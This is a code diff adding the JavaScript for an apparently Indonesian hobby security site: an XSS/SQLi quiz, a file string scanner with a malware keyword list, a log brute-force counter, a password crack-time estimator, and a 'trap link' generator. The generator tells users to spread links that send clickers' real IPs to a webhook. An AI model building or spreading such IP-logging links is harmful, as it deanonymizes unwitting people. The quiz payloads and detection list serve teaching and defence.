+function labChange(){ var v=document.getElementById('labSel').value; var t=v==='xss'?'Soal 1: Ketik payload XSS yang umum dipakai di latihan.':v==='sqli'?"Soal 2: Ketik string bypass login SQLi yang paling umum.":'Soal 3: Decode kode ini: REVMWiBDeWJlciBzdGF0aWU='; document.getElementById('labOut').innerText=t; }
+function doLab(){ var v=document.getElementById('labInput').value; var sel=document.getElementById('labSel').value; var tag='<scr'+'ipt>'; if(sel==='xss'&&v.indexOf(tag)!==-1) document.getElementById('labOut').innerText="Benar. Itu pola XSS dasar."; else if(sel==='sqli'&&v.indexOf("OR 1=1")!==-1) document.getElementById('labOut').innerText="Benar. Itu pola bypass SQLi dasar."; else if(sel==='decode'){ try{ document.getElementById('labOut').innerText="Hasil decode: "+atob(v); }catch(e){ document.getElementById('labOut').innerText="Bukan Base64 yang valid."; } } else document.getElementById('labOut').innerText="Belum tepat. Coba lagi."; }
+async function doMalware(){
+  var f=document.getElementById('mFile').files[0]; if(!f) return alert('Pilih file dulu.');
+  document.getElementById('malOut').innerText='Menghitung...';
+  var buf=await f.arrayBuffer(); var bytes=new Uint8Array(buf);
+  var hashBuf=await crypto.subtle.digest('SHA-256', buf); var hash=Array.from(new Uint8Array(hashBuf)).map(function(b){return b.toString(16).padStart(2,'0')}).join('');
+  var magic=Array.from(bytes.slice(0,8)).map(function(b){return b.toString(16).padStart(2,'0')}).join(' ');
+  var freq=new Array(256).fill(0); for(var i=0;i<bytes.length;i++) freq[bytes[i]]++;
+  var ent=0; for(var i=0;i<256;i++){ if(freq[i]){ var p=freq[i]/bytes.length; ent-=p*Math.log2(p); } }
+  var text=''; var lim=Math.min(bytes.length,500000); for(var i=0;i<lim;i++){ var ch=bytes[i]; if(ch>=32&&ch<127) text+=String.fromCharCode(ch); else text+='\n'; }
+  var needles=['http://','https://','/system/','chmod','sendSms','READ_SMS','getDeviceId','exec(','DexClassLoader','/data/data/']; var found=[]; needles.forEach(function(n){ if(text.indexOf(n)!==-1) found.push(n.trim()); });
+  document.getElementById('malOut').innerText='File: '+f.name+'\nUkuran: '+(f.size/1024).toFixed(1)+' KB\nSHA-256: '+hash+'\nMagic: '+magic+'\nEntropy: '+ent.toFixed(2)+' / 8.00\n\nString yang benar-benar ditemukan:\n'+(found.length?found.join(', '):'Tidak ada dari daftar yang dicek.')+'\n\nBukan vonis malware. Cek SHA-256 di VirusTotal kalau ragu.';
+}
+function doHoney(){
+  var wh=document.getElementById('hpWebhook').value.trim(); var n=document.getElementById('hpName').value.trim()||'jebakan-delz';
+  if(!wh) return alert('Paste webhook.site lu dulu.');
+  var base=location.href.split('?')[0]; var link=base+'?trap='+encodeURIComponent(n)+'&wh='+encodeURIComponent(wh);
+  document.getElementById('hpOut').innerText='LINK JEBAKAN:\n'+link+'\n\nSebar link ini. Yang klik, IP benerannya kekirim ke webhook lu.';
+}
+function doLog(){
+  var t=document.getElementById('logInput').value; if(!t) return alert('Paste log dulu.');
+  var lines=t.split('\n'); var ips={}; var failed=0; var ok=0;
+  lines.forEach(function(l){ var m=l.match(/(\d+\.\d+\.\d+\.\d+)/); if(m){ ips[m[1]]=(ips[m[1]]||0)+1; } if(l.toLowerCase().indexOf('failed')!==-1) failed++; if(l.toLowerCase().indexOf('accepted')!==-1||l.toLowerCase().indexOf('success')!==-1) ok++; });
+  var sorted=Object.keys(ips).sort(function(a,b){return ips[b]-ips[a]}).slice(0,5);
+  document.getElementById('logOut').innerText='Baris: '+lines.length+'\nFailed: '+failed+'\nAccepted/Success: '+ok+'\nIP unik: '+Object.keys(ips).length+'\n\nIP paling sering:\n'+sorted.map(function(ip){return ip+' = '+ips[ip]+'x'}).join('\n')+'\n\n'+(failed>3?'Ada pola brute force. Blokir IP teratas.':'Tidak ada pola brute force.');
+}
+function fmtTime(sec){ if(sec<1) return 'kurang dari 1 detik'; if(sec<60) return sec.toFixed(1)+' detik'; if(sec<3600) return (sec/60).toFixed(1)+' menit'; if(sec<86400) return (sec/3600).toFixed(1)+' jam'; if(sec<31536000) return (sec/86400).toFixed(1)+' hari'; if(sec<3153600000) return (sec/31536000).toFixed(1)+' tahun'; return (sec/31536000).toExponential(2)+' tahun'; }
+function doCrack(){
+  var p=document.getElementById('crackPass').value; if(!p) return alert('Isi password dulu.');
+  var hasLow=/[a-z]/.test(p), hasUp=/[A-Z]/.test(p), hasNum=/\d/.test(p), hasSym=/[^a-zA-Z0-9]/.test(p);
+  var charset=(hasLow?26:0)+(hasUp?26:0)+(hasNum?10:0)+(hasSym?33:0);
+  var entropy=Math.log2(Math.pow(charset, p.length)); var guesses=Math.pow(charset, p.length)/2; var sec=guesses/1e10;
+  document.getElementById('crackOut').innerText='Panjang: '+p.length+' karakter\nCharset: '+charset+'\nEntropy: '+entropy.toFixed(1)+' bit\nRumus: '+charset+' ^ '+p.length+' / 2 / 10 miliar per detik\n\nEstimasi: '+fmtTime(sec);
+}
+renderProjects();
+</script>
+</body>
+</html>
